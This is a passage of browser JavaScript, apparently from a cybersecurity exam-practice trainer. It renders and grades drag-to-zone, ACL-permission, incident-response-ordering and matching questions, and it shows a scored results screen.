  var html='<div class="device-pool"><div class="device-pool-lbl">Devices / Systems -- tap a device then tap a zone</div>';
  for(var i=0;i<q.devices.length;i++){
    html+='<span class="device-chip" id="chip-'+i+'" data-idx="'+i+'">'+q.devices[i].name+'</span>';
  }
  html+='</div><div class="zone-grid">';
  for(var z=0;z<q.zones.length;z++){
    html+='<div class="zone-box" id="zone-box-'+z+'">';
    html+='<div class="zone-box-lbl">'+q.zones[z]+'</div>';
    html+='<div id="zone-devices-'+z+'"></div>';
    html+='</div>';
  }
  html+='</div>';
  document.getElementById('sim-area').innerHTML=html;

  var selectedChip=null;
  for(var i=0;i<q.devices.length;i++){
    (function(idx){
      var chip=document.getElementById('chip-'+idx);
      if(chip) chip.onclick=function(){
        if(this.classList.contains('placed')) return;
        if(selectedChip) selectedChip.style.boxShadow='';
        selectedChip=this;
        this.style.boxShadow='0 0 0 2px var(--amber)';
      };
    })(i);
  }
  for(var z=0;z<q.zones.length;z++){
    (function(zoneIdx){
      var box=document.getElementById('zone-box-'+zoneIdx);
      if(box) box.onclick=function(){
        if(!selectedChip) return;
        var devIdx=parseInt(selectedChip.getAttribute('data-idx'));
        var devContainer=document.getElementById('zone-devices-'+zoneIdx);
        var devEl=document.createElement('span');
        devEl.className='zone-device';
        devEl.setAttribute('data-dev',devIdx);
        devEl.setAttribute('data-zone',zoneIdx);
        devEl.innerHTML=q.devices[devIdx].name+' <span class="remove">[x]</span>';
        devEl.onclick=function(ev){
          ev.stopPropagation();
          var di=parseInt(this.getAttribute('data-dev'));
          var chip2=document.getElementById('chip-'+di);
          if(chip2){chip2.classList.remove('placed');chip2.style.boxShadow='';}
          this.parentNode.removeChild(this);
        };
        devContainer.appendChild(devEl);
        selectedChip.classList.add('placed');
        selectedChip.style.boxShadow='';
        selectedChip=null;
      };
    })(z);
  }
}

function gradeZones(q){
  var pts=0;
  for(var z=0;z<q.zones.length;z++){
    var container=document.getElementById('zone-devices-'+z);
    if(!container) continue;
    var placed=container.querySelectorAll('.zone-device');
    var allOk=true;
    for(var p=0;p<placed.length;p++){
      var di=parseInt(placed[p].getAttribute('data-dev'));
      var ok=q.devices[di].correct===q.zones[z];
      if(ok) pts++;
      else allOk=false;
    }
    var box=document.getElementById('zone-box-'+z);
    if(box) box.className='zone-box '+(allOk&&placed.length>0?'correct-zone':'');
  }
  // Check unplaced devices -- wrong
  var total=q.devices.length;
  return {pts:pts,total:total};
}

// ── ACL RENDERER ──────────────────────────────────────────────────────────

function renderACL(q){
  var html='<div style="overflow-x:auto"><table class="acl-table"><thead><tr><th>Role / Subject</th><th>Resource / Object</th><th>Permission</th></tr></thead><tbody>';
  for(var i=0;i<q.aclRows.length;i++){
    var row=q.aclRows[i];
    html+='<tr>';
    html+='<td>'+row.role+'</td><td>'+row.resource+'</td>';
    html+='<td id="acl-cell-'+i+'"><select id="acl-sel-'+i+'"><option value="">-- Select --</option><option>None</option><option>Read</option><option>Read/Write</option><option>Full Control</option><option>Allow</option></select></td>';
    html+='</tr>';
  }
  html+='</tbody></table></div>';
  document.getElementById('sim-area').innerHTML=html;
}

function gradeACL(q){
  var pts=0;
  for(var i=0;i<q.aclRows.length;i++){
    var row=q.aclRows[i];
    var sel=document.getElementById('acl-sel-'+i);
    var cell=document.getElementById('acl-cell-'+i);
    if(!sel||!cell) continue;
    var ok=sel.value===row.correctPerm;
    if(ok) pts++;
    if(cell) cell.className=ok?'correct-cell':'wrong-cell';
    if(!ok&&sel){var opt=document.createElement('option');opt.value=row.correctPerm;opt.text='Correct: '+row.correctPerm;sel.appendChild(opt);}
    sel.disabled=true;
  }
  return {pts:pts,total:q.aclRows.length};
}

// ── IR ORDER RENDERER ─────────────────────────────────────────────────────

function renderIROrder(q){
  var html='<div class="ir-order-list">';
  var shuffled=shuffle(q.steps.slice());
  for(var i=0;i<shuffled.length;i++){
    html+='<div class="ir-item" id="ir-item-'+i+'" data-text="'+shuffled[i].text.replace(/"/g,'&quot;')+'" data-correct="'+shuffled[i].correct+'">';
    html+='<div class="ir-text">'+shuffled[i].text+'</div>';
    html+='<select class="ir-select" id="ir-sel-'+i+'"><option value="">--</option>';
    for(var j=1;j<=shuffled.length;j++) html+='<option value="'+j+'">'+j+'</option>';
    html+='</select></div>';
  }
  html+='</div>';
  document.getElementById('sim-area').innerHTML=html;
}

function gradeIROrder(q){
  var pts=0;
  for(var i=0;i<q.steps.length;i++){
    var item=document.getElementById('ir-item-'+i);
    var sel=document.getElementById('ir-sel-'+i);
    if(!item||!sel) continue;
    var correctNum=parseInt(item.getAttribute('data-correct'));
    var ok=parseInt(sel.value)===correctNum;
    if(ok) pts++;
    if(item) item.className='ir-item '+(ok?'correct':'wrong');
    if(sel){
      if(!ok){var opt=document.createElement('option');opt.value=correctNum;opt.text='Correct: '+correctNum;sel.appendChild(opt);}
      sel.disabled=true;
    }
  }
  return {pts:pts,total:q.steps.length};
}

// ── MATCH RENDERER ────────────────────────────────────────────────────────

function renderMatch(q){
  var matchOptions=q.pairs.map(function(p){return p.match;});
  var shuffledMatches=shuffle(matchOptions.slice());
  var html='<div>';
  for(var i=0;i<q.pairs.length;i++){
    var pair=q.pairs[i];
    html+='<div class="match-item" id="match-item-'+i+'">';
    html+='<div class="match-item-text"><strong>'+pair.term+'</strong></div>';
    html+='<select class="match-select" id="match-sel-'+i+'"><option value="">-- Select definition --</option>';
    for(var j=0;j<shuffledMatches.length;j++){
      html+='<option value="'+shuffledMatches[j].replace(/"/g,'&quot;')+'">'+shuffledMatches[j]+'</option>';
    }
    html+='</select></div>';
  }
  html+='</div>';
  document.getElementById('sim-area').innerHTML=html;
}

function gradeMatch(q){
  var pts=0;
  for(var i=0;i<q.pairs.length;i++){
    var pair=q.pairs[i];
    var sel=document.getElementById('match-sel-'+i);
    var item=document.getElementById('match-item-'+i);
    if(!sel||!item) continue;
    var ok=sel.value===pair.match;
    if(ok) pts++;
    if(item) item.className='match-item '+(ok?'correct':'wrong');
    if(!ok&&sel){var opt=document.createElement('option');opt.value=pair.match;opt.text='Correct: '+pair.match.substring(0,50)+'...';sel.appendChild(opt);}
    sel.disabled=true;
  }
  return {pts:pts,total:q.pairs.length};
}

// ── SUBMIT ────────────────────────────────────────────────────────────────

function submitAnswer(){
  var q=questions[qi];
  var result={pts:0,total:1};

  if(q.type==='firewall') result=gradeFirewall(q);
  else if(q.type==='logs') result=gradeLogs(q);
  else if(q.type==='zones') result=gradeZones(q);
  else if(q.type==='acl') result=gradeACL(q);
  else if(q.type==='ir-order') result=gradeIROrder(q);
  else if(q.type==='match') result=gradeMatch(q);

  var pct=result.total>0?Math.round(result.pts/result.total*100):0;
  var isCorrect=pct>=70; // 70%+ = correct for PBQs (partial credit)

  if(!typeStats[q.type]) typeStats[q.type]={c:0,t:0};
  typeStats[q.type].t++;
  if(isCorrect){correct++;typeStats[q.type].c++;}else{wrong++;}
  qi++;
  updateStats();

  var fb=document.getElementById('score-fb');
  if(fb){
    fb.className='score-feedback show '+(pct===100?'perfect':pct>=70?'partial':'failed');
    fb.textContent=result.pts+'/'+result.total+' correct ('+pct+'%) -- '+(pct===100?'Perfect!':pct>=70?'Passing score':'Below passing -- review explanation');
  }

  var exp=document.getElementById('pbq-exp');
  if(exp) exp.className='pbq-explanation show';

  var sb=document.getElementById('btn-submit');
  if(sb){sb.disabled=true;sb.textContent='Submitted';}

  var nb=document.getElementById('btn-next');
  if(nb){nb.style.display='block';nb.onclick=function(){nextQ();};}

  if(qi>0&&qi%5===0) logToDashboard(0,'PBQ Trainer',Math.round(correct/qi*100));
}

function nextQ(){renderQ();}

// ── RESULTS ───────────────────────────────────────────────────────────────

function showResults(){
  document.getElementById('pbq-area').style.display='none';
  var res=document.getElementById('results-area');
  res.style.display='block';
  var pct=Math.round(correct/20*100);
  logToDashboard(0,'PBQ Trainer',pct);
  var passed=pct>=70;
  var msg=pct>=90?'Outstanding -- exam-ready!':pct>=70?'Solid -- above PBQ pass threshold.':pct>=50?'Getting there -- keep practising.':'PBQs need more work.';
  var ringColor=passed?'#00ff88':'#ff3d5a';
  var circ=339.3,offset=circ-(pct/100)*circ;

  var topTypes=Object.keys(typeStats).sort(function(a,b){return(typeStats[b].c/typeStats[b].t)-(typeStats[a].c/typeStats[a].t);});
  var bdHTML='';
  for(var ti=0;ti<topTypes.length;ti++){
    var tp=topTypes[ti];var s=typeStats[tp];var p=s.t?Math.round(s.c/s.t*100):0;
    var col=TYPE_COLORS[tp]||'var(--amber)';var lbl=TYPE_LABELS[tp]||tp;
    bdHTML+='<div class="bd-card"><div class="bd-title" style="color:'+col+'">'+lbl+'</div><div class="bd-bar-bg"><div class="bd-bar-fill" style="width:0%;background:'+col+'" data-pct="'+p+'"></div></div><div class="bd-score" style="color:'+col+'">'+p+'%</div><div class="bd-detail">'+s.c+'/'+s.t+' passing</div></div>';
  }

  res.innerHTML=
    '<div class="results-wrap">'+
      '<div class="results-ring"><svg width="140" height="140" viewBox="0 0 140 140">'+
        '<circle cx="70" cy="70" r="54" fill="none" stroke="rgba(255,255,255,0.06)" stroke-width="10"/>'+
        '<circle cx="70" cy="70" r="54" fill="none" stroke="'+ringColor+'" stroke-width="10" stroke-linecap="round" stroke-dasharray="'+circ+'" stroke-dashoffset="'+circ+'" id="ring-anim"/>'+
      '</svg><div class="ring-score"><div class="ring-pct">'+pct+'%</div><div class="ring-lbl">score</div></div></div>'+
      '<div class="results-verdict" style="color:'+ringColor+'">'+(passed?'Passed':'Keep Practising')+'</div>'+
      '<div class="results-sub">'+correct+'/20 passing (70%+ per question) -- '+msg+'</div>'+
      '<div class="breakdown">'+bdHTML+'</div>'+
      '<button class="btn-retake" onclick="retake()">Retake</button>'+
    '</div>';

  setTimeout(function(){
    var ring=document.getElementById('ring-anim');
    if(ring){ring.style.transition='stroke-dashoffset 1.5s ease';ring.style.strokeDashoffset=offset;}
    var fills=document.querySelectorAll('.bd-bar-fill');
    for(var i=0;i<fills.length;i++){fills[i].style.transition='width 1s ease';fills[i].style.width=fills[i].getAttribute('data-pct')+'%';}
  },100);
}

function retake(){
  document.getElementById('pbq-area').style.display='block';
  document.getElementById('results-area').style.display='none';
  questions=buildQuestions();
  qi=0;correct=0;wrong=0;typeStats={};
  updateStats();renderQ();
}

questions=buildQuestions();
updateStats();
renderQ();
</script>
